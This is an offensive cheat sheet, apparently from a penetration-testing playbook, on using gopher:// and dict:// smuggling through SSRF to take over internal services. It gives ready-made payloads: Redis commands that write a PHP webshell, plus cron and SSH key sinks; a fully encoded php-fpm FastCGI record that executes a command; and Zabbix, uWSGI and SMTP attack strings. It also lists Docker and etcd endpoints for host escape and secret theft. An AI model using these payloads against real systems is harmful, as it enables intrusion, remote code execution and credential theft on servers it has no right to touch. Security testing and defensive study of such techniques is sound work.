# SSRF to internal-service RCE via gopher/dict smuggling — Open WHEN: the SSRF reaches an internal raw-TCP service (Redis, php-fpm, MySQL, Memcached, Docker, Zabbix) and you need the exact wire bytes to drive it to code execution

An HTTP-only fetcher cannot speak Redis or FastCGI directly — but `gopher://`
lets you write **arbitrary bytes to a TCP socket**, so you can hand-craft the
service's native protocol and deliver it through the fetch parameter. This is
the central glue of the SSRF chain. `dict://` is a simpler alternative for
line-based protocols (Redis, Memcached) where each command is one line.

General shape:
```
gopher://<host>:<port>/_<URL-encoded raw bytes>
```
The `_` after the port is the gopher item type and is discarded; everything
after it is sent verbatim. CRLF must be encoded as `%0D%0A`. Build the byte
string, URL-encode it, then place it in the fetch parameter. With `curl`,
read raw output with `--output -` (pipe to `xxd` for binary replies).

Tooling that emits ready gopher strings:
- **Gopherus** — generates gopher links for Redis, MySQL, FastCGI, SMTP,
  Memcached (`pymemcache`/`rbmemcache`/`phpmemcache`/`dmpmemcache`), Zabbix.
- **SSRFmap** — automated SSRF module runner (Redis, AXFR, etc.).

---

## Redis (:6379) — webshell or cron via disk write

Redis with no auth lets you redirect its dump file to the webroot and write a
PHP webshell. Native command sequence:
```
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET[0]);?>"
SAVE
```
Then fetch `http://target/shell.php?0=id` to confirm.

`dict://` form (one command per request):
```
dict://127.0.0.1:6379/CONFIG%20SET%20dir%20/var/www/html
dict://127.0.0.1:6379/CONFIG%20SET%20dbfilename%20shell.php
dict://127.0.0.1:6379/SET%20x%20"<\x3Fphp system($_GET[0])\x3F>"
dict://127.0.0.1:6379/SAVE
```

`gopher://` form (the leading `_` then inline commands separated by `%0D%0A`):
```
gopher://127.0.0.1:6379/_config%20set%20dir%20%2Fvar%2Fwww%2Fhtml
gopher://127.0.0.1:6379/_config%20set%20dbfilename%20shell.php
gopher://127.0.0.1:6379/_set%20x%20%22%3C%3Fphp%20system%28%24_GET%5B0%5D%29%3B%3F%3E%22
gopher://127.0.0.1:6379/_save
```
Alternate sinks for the same write primitive: drop a key into
`/var/spool/cron/crontab` (cron job) or `~/.ssh/authorized_keys`.

---

## FastCGI / php-fpm (:9000) — direct RCE

php-fpm trusts FastCGI params. Set `PHP_VALUE` to turn on
`auto_prepend_file=php://input` and `allow_url_include`, point
`SCRIPT_FILENAME` at any existing PHP file (default `/usr/share/php/PEAR.php`),
and put your code in the request body. The fully-encoded gopher record runs
`system('whoami')`:
```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/usr/share/php/PEAR.php%0D%01DOCUMENT_ROOT/%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3F%3E%00%00%00%00
```
Regenerate with Gopherus when the script path or command differs.

---

## MySQL (:3306)

Works when the MySQL user has no password. Gopherus builds the auth + query
packet (`gopherus.py --exploit mysql`, give username + query). The emitted
string is a long `gopher://127.0.0.1:3306/_...` record carrying the handshake
response and one `SELECT`/statement.

---

## Memcached (:11211)

Stored serialized objects can be poisoned, leading to deserialization RCE in
the consuming app. Generate the gopher record with Gopherus
(`--exploit pymemcache` / `rbmemcache` / `phpmemcache` / `dmpmemcache`)
matching the app's language, then deliver it.

---

## Zabbix agent (:10050)

If the agent runs with `EnableRemoteCommands=1`, `system.run[...]` executes a
shell command:
```
gopher://127.0.0.1:10050/_system.run%5B%28id%29%3Bsleep%202s%5D
```

---

## uWSGI (:8000)

The `UWSGI_FILE` packet makes uWSGI load and run an arbitrary `.py`:
```
gopher://localhost:8000/_%00%1A%00%00%0A%00UWSGI_FILE%0C%00/tmp/test.py
```
(Header bytes: modifier1=0, datasize=26, then key `UWSGI_FILE` and value =
path to a script you previously wrote.)

---

## SMTP (:25)

Smuggle an SMTP conversation to send mail from an internal relay:
```
gopher://localhost:25/_HELO%20victim.com%0AMAIL%20FROM:<a@victim.com>%0ARCPT%20TO:<you@example.tld>%0ADATA%0ASubject:%20x%0Abody%0A.%0A
```

---

## Docker API (:2375) / Kubernetes etcd (:2379)

```
Docker:  http://127.0.0.1:2375/v1.24/containers/json    enumerate, then create a
         container with the host fs mounted to escape to host RCE
etcd:    http://127.0.0.1:2379/v2/keys/?recursive=true   read cluster secrets
```
These speak plain HTTP, so no gopher is needed — the SSRF reaches them
directly once the port is found.

---

## Reading blind replies

When the fetcher returns no body, drive a state change and verify it another
way: after a Redis webshell write, request the shell URL directly; for
metadata, trigger an OOB DNS/HTTP callback inside the smuggled request. Blind
HTTP(S) chains exist for Elasticsearch, Consul, Druid, Solr, Jenkins,
Confluence, Jira, Weblogic, Struts; blind gopher chains for Redis, Memcached,
and Tomcat (manager-deploy a WAR).
